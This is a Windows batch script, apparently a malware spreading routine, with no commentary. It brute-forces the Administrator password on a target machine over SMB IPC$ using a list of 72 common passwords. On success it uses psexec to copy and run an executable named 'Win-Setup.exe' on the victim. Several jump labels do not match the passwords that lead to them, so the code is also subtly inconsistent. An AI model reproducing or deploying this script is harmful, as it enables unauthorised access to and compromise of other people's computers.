@echo off
net use \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto 1
net use \\%1\ipc$ "1" /user:Administrator
if not errorlevel 1 goto 2
net use \\%1\ipc$ "12" /user:Administrator
if not errorlevel 1 goto 3
net use \\%1\ipc$ "121" /user:Administrator
if not errorlevel 1 goto 4
net use \\%1\ipc$ "1212" /user:Administrator
if not errorlevel 1 goto 5
net use \\%1\ipc$ "123" /user:Administrator
if not errorlevel 1 goto 6
net use \\%1\ipc$ "123456" /user:Administrator
if not errorlevel 1 goto 7
net use \\%1\ipc$ "12345678" /user:Administrator
if not errorlevel 1 goto 8
net use \\%1\ipc$ "abc" /user:Administrator
if not errorlevel 1 goto 9
net use \\%1\ipc$ "access" /user:Administrator
if not errorlevel 1 goto 10
net use \\%1\ipc$ "adm" /user:Administrator
if not errorlevel 1 goto 11
net use \\%1\ipc$ "admin" /user:Administrator
if not errorlevel 1 goto 12
net use \\%1\ipc$ "administrator" /user:Administrator
if not errorlevel 1 goto 13
net use \\%1\ipc$ "administrateur" /user:Administrator
if not errorlevel 1 goto 14
net use \\%1\ipc$ "adminpass" /user:Administrator
if not errorlevel 1 goto 15
net use \\%1\ipc$ "adminpasswd" /user:Administrator
if not errorlevel 1 goto 16
net use \\%1\ipc$ "adminpassword" /user:Administrator
if not errorlevel 1 goto 17
net use \\%1\ipc$ "allprivate" /user:Administrator
if not errorlevel 1 goto 18
net use \\%1\ipc$ "asd" /user:Administrator
if not errorlevel 1 goto 19
net use \\%1\ipc$ "c" /user:Administrator
if not errorlevel 1 goto 20
net use \\%1\ipc$ "cisco" /user:Administrator
if not errorlevel 1 goto 21
net use \\%1\ipc$ "database" /user:Administrator
if not errorlevel 1 goto 22
net use \\%1\ipc$ "default" /user:Administrator
if not errorlevel 1 goto 23
net use \\%1\ipc$ "defaultuser" /user:Administrator
if not errorlevel 1 goto 24
net use \\%1\ipc$ "domain" /user:Administrator
if not errorlevel 1 goto 25
net use \\%1\ipc$ "domainadmin" /user:Administrator
if not errorlevel 1 goto 26
net use \\%1\ipc$ "enable" /user:Administrator
if not errorlevel 1 goto 27
net use \\%1\ipc$ "guest" /user:Administrator
if not errorlevel 1 goto 28
net use \\%1\ipc$ "iis" /user:Administrator
if not errorlevel 1 goto 29
net use \\%1\ipc$ "iisadmin" /user:Administrator
if not errorlevel 1 goto 30
net use \\%1\ipc$ "iispass" /user:Administrator
if not errorlevel 1 goto 31
net use \\%1\ipc$ "iisserver" /user:Administrator
if not errorlevel 1 goto 32
net use \\%1\ipc$ "iiserver" /user:Administrator
if not errorlevel 1 goto 33
net use \\%1\ipc$ "install" /user:Administrator
if not errorlevel 1 goto 34
net use \\%1\ipc$ "localadmin" /user:Administrator
if not errorlevel 1 goto 35
net use \\%1\ipc$ "mail" /user:Administrator
if not errorlevel 1 goto 36
net use \\%1\ipc$ "mailadmin" /user:Administrator
if not errorlevel 1 goto 37
net use \\%1\ipc$ "mailpass" /user:Administrator
if not errorlevel 1 goto 38
net use \\%1\ipc$ "oem" /user:Administrator
if not errorlevel 1 goto 39
net use \\%1\ipc$ "oemcomputer" /user:Administrator
if not errorlevel 1 goto 40
net use \\%1\ipc$ "oempassword" /user:Administrator
if not errorlevel 1 goto 41
net use \\%1\ipc$ "oemuser" /user:Administrator
if not errorlevel 1 goto 42
net use \\%1\ipc$ "pass" /user:Administrator
if not errorlevel 1 goto 43
net use \\%1\ipc$ "passwd" /user:Administrator
if not errorlevel 1 goto 44
net use \\%1\ipc$ "password" /user:Administrator
if not errorlevel 1 goto 45
net use \\%1\ipc$ "password1234" /user:Administrator
if not errorlevel 1 goto 46
net use \\%1\ipc$ "private" /user:Administrator
if not errorlevel 1 goto 47
net use \\%1\ipc$ "proxy" /user:Administrator
if not errorlevel 1 goto 48
net use \\%1\ipc$ "public" /user:Administrator
if not errorlevel 1 goto 49
net use \\%1\ipc$ "pwd" /user:Administrator
if not errorlevel 1 goto 50
net use \\%1\ipc$ "qaz" /user:Administrator
if not errorlevel 1 goto 51
net use \\%1\ipc$ "qwe" /user:Administrator
if not errorlevel 1 goto 52
net use \\%1\ipc$ "qwerty" /user:Administrator
if not errorlevel 1 goto 53
net use \\%1\ipc$ "router" /user:Administrator
if not errorlevel 1 goto 54
net use \\%1\ipc$ "sa" /user:Administrator
if not errorlevel 1 goto 55
net use \\%1\ipc$ "settings" /user:Administrator
if not errorlevel 1 goto 56
net use \\%1\ipc$ "setup" /user:Administrator
if not errorlevel 1 goto 57
net use \\%1\ipc$ "server" /user:Administrator
if not errorlevel 1 goto 58
net use \\%1\ipc$ "serverpass" /user:Administrator
if not errorlevel 1 goto 59
net use \\%1\ipc$ "serverpasswd" /user:Administrator
if not errorlevel 1 goto 60
net use \\%1\ipc$ "serverpassword" /user:Administrator
if not errorlevel 1 goto 61
net use \\%1\ipc$ "system" /user:Administrator
if not errorlevel 1 goto 62
net use \\%1\ipc$ "test1" /user:Administrator
if not errorlevel 1 goto 63
net use \\%1\ipc$ "testuser" /user:Administrator
if not errorlevel 1 goto 64
net use \\%1\ipc$ "user1" /user:Administrator
if not errorlevel 1 goto 65
net use \\%1\ipc$ "wadmin" /user:Administrator
if not errorlevel 1 goto 66
net use \\%1\ipc$ "web" /user:Administrator
if not errorlevel 1 goto 67
net use \\%1\ipc$ "webadmin" /user:Administrator
if not errorlevel 1 goto 68
net use \\%1\ipc$ "wordpass" /user:Administrator
if not errorlevel 1 goto 69
net use \\%1\ipc$ "write" /user:Administrator
if not errorlevel 1 goto 70
net use \\%1\ipc$ "wwwadmin" /user:Administrator
if not errorlevel 1 goto 71
net use \\%1\ipc$ "zxc" /user:Administrator
if not errorlevel 1 goto 72
goto end
:1
psexec \\%1 -u Administrator -p "" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p ""-d Win-Setup.exe -o
goto end
:2
psexec \\%1 -u Administrator -p "1" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "1" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "1" -d Win-Setup.exe -o
goto end
:3
psexec \\%1 -u Administrator -p "12" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "12" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "12" -d Win-Setup.exe -o
goto end
:4
psexec \\%1 -u Administrator -p "121" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "121" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "121" -d Win-Setup.exe -o
goto end
:5
psexec \\%1 -u Administrator -p "1212" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "1212" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "1212" -d Win-Setup.exe -o
goto end
:6
psexec \\%1 -u Administrator -p "123" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "123" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "123" -d Win-Setup.exe -o
goto end
:7
psexec \\%1 -u Administrator -p "123456" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "123456" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "123456" -d Win-Setup.exe -o
goto end
:8
psexec \\%1 -u Administrator -p "12345678" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "12345678" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "12345678" -d Win-Setup.exe -o
goto end
:9
psexec \\%1 -u Administrator -p "abc" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "abc" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "abc" -d Win-Setup.exe -o
goto end
:10
psexec \\%1 -u Administrator -p "access" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "access" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "access" -d Win-Setup.exe -o
goto end
:11
psexec \\%1 -u Administrator -p "adm" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "adm" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "adm" -d Win-Setup.exe -o
goto end
:12
psexec \\%1 -u Administrator -p "admin" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "admin" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "admin" -d Win-Setup.exe -o
goto end
:13
psexec \\%1 -u Administrator -p "administrateur" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "administrateur" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "administrateur" -d Win-Setup.exe -o
goto end
:14
psexec \\%1 -u Administrator -p "administrator" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "administrator" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "administrator" -d Win-Setup.exe -o
goto end
:15
psexec \\%1 -u Administrator -p "adminpass" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "adminpass" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "adminpass" -d Win-Setup.exe -o
goto end
:16
psexec \\%1 -u Administrator -p "adminpasswd" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "adminpasswd" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "adminpasswd" -d Win-Setup.exe -o
goto end
:17
psexec \\%1 -u Administrator -p "adminpassword" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "adminpassword" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "adminpassword" -d Win-Setup.exe -o
goto end
:18
psexec \\%1 -u Administrator -p "allprivate" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "allprivate" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "allprivate" -d Win-Setup.exe -o
goto end
:19
psexec \\%1 -u Administrator -p "asd" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "asd" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "asd" -d Win-Setup.exe -o
goto end
:20
psexec \\%1 -u Administrator -p "c" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "c" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "c" -d Win-Setup.exe -o
goto end
:21
psexec \\%1 -u Administrator -p "cisco" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "cisco" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "cisco" -d Win-Setup.exe -o
goto end
:22
psexec \\%1 -u Administrator -p "database" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "database" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "database" -d Win-Setup.exe -o
goto end
:23
psexec \\%1 -u Administrator -p "default" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "default" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "default" -d Win-Setup.exe -o
goto end
:24
psexec \\%1 -u Administrator -p "defaultuser" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "defaultuser" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "defaultuser" -d Win-Setup.exe -o
goto end
:25
psexec \\%1 -u Administrator -p "domain" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "domain" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "domain" -d Win-Setup.exe -o
goto end
:26
psexec \\%1 -u Administrator -p "domainadmin" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "domainadmin" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "domainadmin" -d Win-Setup.exe -o
goto end
:27
psexec \\%1 -u Administrator -p "enable" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "enable" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "enable" -d Win-Setup.exe -o
goto end
:28
psexec \\%1 -u Administrator -p "guest" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "guest" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "guest" -d Win-Setup.exe -o
goto end
:29
psexec \\%1 -u Administrator -p "iis" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "iis" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "iis" -d Win-Setup.exe -o
goto end
:30
psexec \\%1 -u Administrator -p "iisadmin" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "iisadmin" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "iisadmin" -d Win-Setup.exe -o
goto end
:31
psexec \\%1 -u Administrator -p "iiserver" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "iiserver" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "iiserver" -d Win-Setup.exe -o
goto end
:32
psexec \\%1 -u Administrator -p "iispass" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "iispass" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "iispass" -d Win-Setup.exe -o
goto end
:33
psexec \\%1 -u Administrator -p "iisserver" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "iisserver" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "iisserver" -d Win-Setup.exe -o
goto end
:34
psexec \\%1 -u Administrator -p "install" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "install" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "install" -d Win-Setup.exe -o
goto end
:35
psexec \\%1 -u Administrator -p "localadmin" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "localadmin" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "localadmin" -d Win-Setup.exe -o
goto end
:36
psexec \\%1 -u Administrator -p "mail" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "mail" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "mail" -d Win-Setup.exe -o
goto end
:37
psexec \\%1 -u Administrator -p "mailadmin" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "mailadmin" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "mailadmin" -d Win-Setup.exe -o
goto end
:38
psexec \\%1 -u Administrator -p "mailpass" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "mailpass" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "mailpass" -d Win-Setup.exe -o
goto end
:39
psexec \\%1 -u Administrator -p "oem" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "oem" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "oem" -d Win-Setup.exe -o
goto end
:40
psexec \\%1 -u Administrator -p "oemcomputer" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "oemcomputer" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "oemcomputer" -d Win-Setup.exe -o
goto end
:41
psexec \\%1 -u Administrator -p "oempassword" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "oempassword" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "oempassword" -d Win-Setup.exe -o
goto end
:42
psexec \\%1 -u Administrator -p "oemuser" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "oemuser" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "oemuser" -d Win-Setup.exe -o
goto end
:43
psexec \\%1 -u Administrator -p "pass" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "pass" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "pass" -d Win-Setup.exe -o
goto end
:44
psexec \\%1 -u Administrator -p "passwd" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "passwd" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "passwd" -d Win-Setup.exe -o
goto end
:45
psexec \\%1 -u Administrator -p "password" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "password" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "password" -d Win-Setup.exe -o
goto end
:46
psexec \\%1 -u Administrator -p "password1234" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "password1234" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "password1234" -d Win-Setup.exe -o
goto end
:47
psexec \\%1 -u Administrator -p "private" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "private" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "private" -d Win-Setup.exe -o
goto end
:48
psexec \\%1 -u Administrator -p "proxy" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "proxy" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "proxy" -d Win-Setup.exe -o
goto end
:49
psexec \\%1 -u Administrator -p "public" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "public" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "public" -d Win-Setup.exe -o
goto end
:50
psexec \\%1 -u Administrator -p "pwd" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "pwd" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "pwd" -d Win-Setup.exe -o
goto end
:51
psexec \\%1 -u Administrator -p "qaz" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "qaz" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "qaz" -d Win-Setup.exe -o
goto end
:52
psexec \\%1 -u Administrator -p "qwe" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "qwe" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "qwe" -d Win-Setup.exe -o
goto end
:53
psexec \\%1 -u Administrator -p "qwerty" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "qwerty" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "qwerty" -d Win-Setup.exe -o
goto end
:54
psexec \\%1 -u Administrator -p "router" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "router" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "router" -d Win-Setup.exe -o
goto end
:55
psexec \\%1 -u Administrator -p "sa" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "sa" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "sa" -d Win-Setup.exe -o
goto end
:56
psexec \\%1 -u Administrator -p "server" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "server" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "server" -d Win-Setup.exe -o
goto end
:57
psexec \\%1 -u Administrator -p "serverpass" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "serverpass" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "serverpass" -d Win-Setup.exe -o
goto end
:58
psexec \\%1 -u Administrator -p "serverpasswd" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "serverpasswd" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "serverpasswd" -d Win-Setup.exe -o
goto end
:59
psexec \\%1 -u Administrator -p "serverpassword" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "serverpassword" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "serverpassword" -d Win-Setup.exe -o
goto end
:60
psexec \\%1 -u Administrator -p "settings" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "settings" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "settings" -d Win-Setup.exe -o
goto end
:61
psexec \\%1 -u Administrator -p "setup" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "setup" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "setup" -d Win-Setup.exe -o
goto end
:62
psexec \\%1 -u Administrator -p "system" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "system" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "system" -d Win-Setup.exe -o
goto end
:63
psexec \\%1 -u Administrator -p "test1" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "test1" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "test1" -d Win-Setup.exe -o
goto end
:64
psexec \\%1 -u Administrator -p "testuser" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "testuser" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "testuser" -d Win-Setup.exe -o
goto end
:65
psexec \\%1 -u Administrator -p "user1" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "user1" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "user1" -d Win-Setup.exe -o
goto end
:66
psexec \\%1 -u Administrator -p "wadmin" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "wadmin" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "wadmin" -d Win-Setup.exe -o
goto end
:67
psexec \\%1 -u Administrator -p "web" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "web" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "web" -d Win-Setup.exe -o
goto end
:68
psexec \\%1 -u Administrator -p "webadmin" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "webadmin" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "webadmin" -d Win-Setup.exe -o
goto end
:69
psexec \\%1 -u Administrator -p "wordpass" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "wordpass" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "wordpass" -d Win-Setup.exe -o
goto end
:70
psexec \\%1 -u Administrator -p "write" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "write" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "write" -d Win-Setup.exe -o
goto end
:71
psexec \\%1 -u Administrator -p "wwwadmin" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "wwwadmin" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "wwwadmin" -d Win-Setup.exe -o
goto end
:72
psexec \\%1 -u Administrator -p "zxc" -d psexec.exe -r Win-Setup.exe
psexec \\%1 -u Administrator -p "zxc" -f -c -d Win-Setup.exe -o
psexec \\%1 -u Administrator -p "zxc" -d Win-Setup.exe -o
goto end

:end